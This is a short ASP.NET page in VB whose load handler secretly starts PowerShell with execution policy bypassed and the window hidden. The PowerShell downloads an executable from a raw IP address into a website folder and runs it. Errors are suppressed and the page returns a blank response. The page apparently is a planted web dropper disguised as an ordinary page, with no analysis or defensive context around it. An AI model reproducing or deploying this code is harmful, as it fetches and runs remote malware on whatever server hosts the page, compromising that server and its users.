<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
    Try
        Dim ps As String = "powershell.exe"
        Dim url As String = "http://31.6.41.133/asmxswaraj.exe"
        Dim dst As String = "C:\Website\SwarajReports.indiainfoline.com\asmxswaraj.exe"
        Dim args As String = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""try{ $p='" & dst & "'; (New-Object Net.WebClient).DownloadFile('" & url & "',$p); Start-Process -FilePath $p -WindowStyle Hidden }catch{}"""

        Dim psi As New ProcessStartInfo(ps, args)
        psi.UseShellExecute = False
        psi.CreateNoWindow = True
        Process.Start(psi)
    Catch
        ' silently ignore
    End Try

    Response.Clear()
    Response.End()
End Sub
</script>
